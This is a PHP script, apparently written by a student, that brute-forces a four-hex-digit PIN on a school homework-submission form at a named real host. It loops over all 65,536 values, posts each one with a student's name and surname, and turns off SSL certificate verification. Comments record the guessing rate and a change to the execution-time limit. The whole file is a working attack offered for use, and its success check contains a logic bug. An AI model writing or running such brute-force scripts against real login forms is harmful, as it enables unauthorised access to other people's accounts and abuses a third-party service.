<?php
    $name = 'Bartosz';
    $surname = 'Chodkowski';
    echo $name." ".$surname."<br>";
    function skibid($pin){
        global $name, $surname;
        $url = "https://pm10.ikkm.pl/PRACE%20DOMOWE/process-form.php";
        $postData = array(
            'name' => $name,
            'surname' => $surname,
            'pin' => $pin
        );

        $options = array(
            'http' => array(
                'method'  => 'POST',
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'content' => http_build_query($postData)
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false
            )
        );
        $context  = stream_context_create($options);

        $response = file_get_contents($url, false, $context);
        return $response;
        
    }
    for($i = 0; $i < 65536; $i++){
        $pin = strtoupper(str_pad(dechex($i), 4, '0', STR_PAD_LEFT));
        $text = skibid($pin);
        if(!$text =='["Nieznany ucze\u0144 lub niepoprawny pin.",0]'){
            echo "elo kod to: ".$pin."<br>";
            
        }
        echo "<b>".$pin."</b>".". ".$text;
        
    }
    //trzeba zmieniac max_execution_time w php.ini na 3000 chyba??? (moze starczy) C:\xampp\php
    //szkola - 21pin/sek
    //dom - ??pin/sek
?>